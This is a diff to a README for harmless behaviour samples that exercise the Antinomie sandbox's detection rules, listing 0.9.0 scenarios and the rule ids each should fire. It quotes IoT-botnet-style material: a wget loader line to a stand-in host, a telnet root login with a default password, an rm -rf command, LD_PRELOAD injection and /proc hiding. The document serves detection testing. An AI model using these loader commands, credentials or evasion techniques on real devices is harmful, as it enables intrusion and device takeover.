@@ -1,12 +1,14 @@
 # Behavior samples
 
-`demo-*` are small static x86-64 ELFs that reproduce the *shape* of attacker
-behaviour for testing Antinomie end to end, above all the 0.7.1 Suspicious
+`demo-*` are small static ELFs (built for x86-64, 32-bit x86, arm64 and 32-bit
+ARM) that reproduce the *shape* of attacker behaviour for testing Antinomie end to end, above all the 0.7.1 Suspicious
 activity rules, the network triage and the activity graph. They are not stress
 tests: each scenario does a handful of things an analyst would triage, then
 exits. `demo-all` runs every scenario in the order of the graph's phases
 (recon, download, persistence, escalation, hide/inject, C2, spread, impact),
-so one run is a short intrusion storyline.
+so one run is a short intrusion storyline. `demo-090` runs only the
+scenarios of the 0.9.0 analysis features (see "0.9.0 scenarios" below);
+`demo-all` runs them too, each in its phase.
 
 Everything harmful is replaced by a harmless destination or a harmless form:
 
@@ -40,7 +42,14 @@ Everything harmful is replaced by a harmless destination or a harmless form:
   ptrace and `/proc/PID/mem` only ever target a child the sample forked;
 - no real credential is read: decoys only; the standard locations are `stat`ed;
 - every loop is bounded by a constant or by `--rounds` (1-50), every wait is
-  bounded, and every helper process is killed by pid if it overruns.
+  bounded, and every helper process is killed by pid if it overruns;
+- the only programs started that are not this binary are the benign system
+  commands of `rule-markers` and `live-scan` (`uname`, `id`, `crontab -l`,
+  `cat`) and the small library and dynamic child of `preload-lib`, built with
+  the samples and embedded in them: they print one line and exit;
+- signals and ptrace only ever target the sample's own children; device nodes
+  such as `/dev/watchdog` and `/dev/mtd0` are only `stat`ed (opening the
+  watchdog arms it).
 
 Options accept both `--host 10.0.2.2` and `--host=10.0.2.2`. A bare
 `./demo-all` runs every scenario; `--only a,b` selects a subset, `--list`
@@ -54,8 +63,14 @@ tests/monitor/build-behavior-samples.sh /tmp/demo-all --dynamic
 ```
 
 Static is the default (glibc, no `PT_INTERP`), which runs on every guest base.
-The script builds `demo-all` and one `demo-<scenario>` per entry of
-`./demo-all --list`, with `-Wall -Wextra` and no warnings.
+The script builds `demo-all`, `demo-090` and one `demo-<scenario>` per entry of
+`./demo-all --list`, with `-Wall -Wextra` and no warnings. `CC` picks the
+architecture: `gcc` (x86-64), `i686-linux-gnu-gcc` (32-bit x86),
+`aarch64-linux-gnu-gcc` (arm64) and `arm-linux-gnueabihf-gcc` (32-bit ARM);
+a cross build lists the scenarios with a host build. The `preload-lib`
+scenario's library and child (`behavior-samples/payload/`) are built
+dynamic with the same compiler and embedded as data; a build of the `.c`
+files without the script has no payload and the scenario says so.
 
 ## Quick start
 
@@ -95,8 +110,11 @@ activity over a minute so the graph can separate the phases.
 --ignore LIST     skip check categories: debugger,vm,container,sandbox
 --evade-sleep MS  the evading sleep (0-5000; default 3000-4500)
 --test-root DIR   tests only: the checks read their files below DIR (see Evasive variant)
---list            registry: name, phase, requires, expected rule ids, summary (tab separated)
+--screen-seconds N  allow screen-ticker: a changing console line every second for N s (1-120)
+--long            allow live-scan: rule-matching work every 10 s for about 150 s
+--list            registry: name, phase, requires, expected rule ids, summary, set (tab separated)
 --all / --only a,b   select scenarios in demo-all
+--set 0.9.0       demo-all: only the 0.9.0 scenarios (what demo-090 runs)
 ```
 
 Several rules look at the work directory's path: a hidden component (`.cache`,
@@ -210,6 +228,43 @@ same address was seen, and otherwise marks it VM-wide (one tier lower).
 | `privilege.kernel_helper_hijack` | exact existing kernel files (`core_pattern`, `modprobe`, `uevent_helper`, `binfmt_misc/register`); opening them for writing is not harmless |
 | `rootkit.dev_mem` | exact device nodes `/dev/mem`, `/dev/kmem`, `/dev/port`, `/proc/kcore`; the samples do not open raw-memory devices, even read-only |
 | `process.exec` | INFO, counted for every program the samples start; it has no scenario of its own |
+
+## 0.9.0 scenarios (`demo-090`)
+
+One scenario per analysis feature of 0.9.0, the registry's "0.9.0" set. `demo-090`
+runs them in phase order (`--only` picks some, `--list` shows them); `demo-all`
+runs them among the others, and each also has its own `demo-<scenario>`.
+
+```sh
+./demo-090 --rounds 1 --gap 0 --wide --screen-seconds 30     # in the guest
+./demo-090 --only live-scan --long                            # the live scan, about 150 s
+```
+
+| Scenario | Feature | Rule ids it should fire | What to look at in Antinomie |
+|---|---|---|---|
+| `demo-odd-exec-paths` | T0562 | `execution.dropped_exec`, `execution.temp_exec`, `execution.chmod_exec_temp` | A copy written as `.cache/w.bin` and run as `.cache/./w.bin`, `.cache/x/../w.bin` and `.cache//w.bin`: one dropped program in Written files and the lineage, not base noise. |
+| `demo-quick-exit` | T0342, T0344 | `persistence.systemd`, `persistence.cron` | A child writes a systemd unit lookalike and exits within milliseconds; a `crontab` stand-in does the same. With **Dump when suspicious activity is seen** (core) on a revision-22 base each is held at its exit and its core taken ("held at its exit" in the trigger log). `demo-quick-exit` itself ends within a second: its static analysis comes from the launch reply's hash. |
+| `demo-persisted-copy` | T0433 | `persistence.copy_running` (see note) | A copy of the sample (`.cache/.persist/xvr-update`) run by a detached grandchild for 12 s; the scenario waits for it. The finding needs a process *outside* the recorded tree (started by cron or a service); the guest records a detached grandchild, so expect the process tree and the dropped copy, not the finding. |
+| `demo-preload-lib` | T0398 | `injection.dropped_preload`, `injection.ld_preload_env`, `execution.dropped_exec`, `execution.temp_exec`, `execution.chmod_exec_temp` | A library the run wrote (`.cache/libdemo-preload.so`), loaded with `LD_PRELOAD` and with `LD_AUDIT` into a dynamic child that prints `library loaded before main`; the library is in the YARA scan's inputs as a file the run wrote; a lookalike `etc/ld.so.preload` in the work directory. Needs the guest's loader for the build's architecture (the x86-64 and arm64 BusyBox bases have theirs; a 32-bit build usually has none and prints `UNAVAILABLE ... no dynamic loader`). |
+| `demo-pid-hide-killer` | T0436 | `evasion.process_rename`, `discovery.process_enum`, `execution.dropped_exec`, `execution.temp_exec` | `open_tree(OPEN_TREE_CLONE)` and `move_mount` over `/proc/<own child>` with a flag no kernel accepts (EINVAL; EPERM first for a normal user); a killer that reads 32 `/proc/PID/cmdline` files and SIGKILLs three of its own children; a copy of the sample named `sh` renamed to `rm` after `sh -c 'rm -rf ...'` (no finding: the BusyBox false positive is gone) and after `sh -c 'echo demo-check'` (`evasion.process_rename`). |
+| `demo-dead-c2` | T0399, T0436 | `network.dead_c2` | Twelve blocking connects to `--host` port 48101, each cut off after 1.5 s; with `--wide` twelve more to 203.0.113.7. The rule counts public addresses only and failures that are refused, timed out or unreachable: it fires for the `--wide` tries on a Routed VM with the Drop route (the gateway refuses) or a disconnected guest, not for a private `--host` and not where InetSim accepts every port. |
+| `demo-inetsim-iot` | T0559 | `network.inetsim_telnet_login`, `network.inetsim_loader`, `network.inetsim_download` | On a Routed VM with the InetSim route: a telnet login to `--host:23` as root/xc3511, the `/bin/busybox DEMOBOT` probe and a `wget http://bins.example-loader.invalid/demo.x86 -O-` loader line; an FTP `RETR demo.x86` and a TFTP read of `demo.mips`, both saved in the work directory and never run. The Network view's InetSim tab lists the sessions. Private or TEST-NET `--host` only. |
+| `demo-iot-device` | T0558 | `evasion.firewall_modify`, `impact.block_device_write` | `iptables -A/-D/-P` and `iptables-restore` stand-ins, `watchdog`, `flash_erase`, `flash_eraseall` and `mtd erase` stand-ins, `stat` of `/dev/watchdog*` and `/dev/mtd*`, `/proc/mtd` read, and MEMERASE and MEMERASE64 on a regular file in the work directory (refused with ENOTTY, so the block-device row is a failed attempt). |
+| `demo-signal-sender` | T0278 | (none by design) | One child sends SIGTERM to one sibling and SIGKILL to another: Triage's note on killed processes names the sender (revision-21 bases and newer). |
+| `demo-decoders` | T0256, T0302, T0461 | `evasion.io_uring_usage`, `evasion.process_rename` | The Syscall Trace's decoded arguments, with no schema gaps: FIONREAD and FIONBIO on a pipe, a socket pair and a UDP socket; `arch_prctl` (ARCH_GET_CPUID, ARCH_GET_FS, ARCH_CET_STATUS) on x86 only; a child's `PR_SET_NAME`/`PR_GET_NAME` (the name's address shown as an address); one io_uring READV (setup, rings, submission entry) and one AIO read (`iocb`, `io_event`) of a work file. |
+| `demo-fork-debug` | x86-64 debugger | (none by design) | Break on `demo_fork_breakpoint` (its address is printed); it is called before the fork, twice in the child and after the fork. The child the debugger does not follow runs its own code and exits 0 (before 0.9.0 it met the INT3 and died of SIGTRAP). |
+| `demo-screen-ticker` (needs `--screen-seconds N`) | T0487 | (none by design) | A `TICK` line every second with a moving bar, on standard output and, when it can be opened (root in a guest), on `/dev/console`, so **Timed screenshots** shows a changing screen. |
+| `demo-live-scan` (needs `--long`) | T0460 | `persistence.cron`, `discovery.system_info`, `discovery.user_enum` | Sixteen rounds 10 s apart (about 150 s): YARA marker strings in `live/markers-NN.txt`, a `crontab` stand-in, real `uname -a` and `id`, a check-in POST. The live detection scan (every 2 minutes by default) runs at least once while it goes; its hits depend on the rule packs. |
+
+### 0.9.0 rows that the samples do not produce, and why
+
+| Rule | Why |
+|---|---|
+| `evasion.watchdog_disable` | needs `/dev/watchdog` opened for writing, an ioctl on it or its magic close; opening it arms the watchdog, so the samples only `stat` it |
+| `impact.service_takeover`, `evasion.process_killer` | need SIGKILL or SIGTERM to processes the run did not start; the samples signal only their own children |
+| `evasion.proc_hide_mount` (the `move_mount` form) | needs a `move_mount` the kernel accepts; the samples' calls carry a refused flag (the `mount(MS_BIND)` form is in `evasion-misc`, refused as well) |
+| `persistence.copy_running` | needs the copy started outside the recorded tree (cron, systemd, init); the samples never install real persistence |
+| `network.inetsim_upload` | needs an upload to InetSim's FTP or TFTP; the samples send nothing out but check-ins |
 
 ## Evasive variant
 
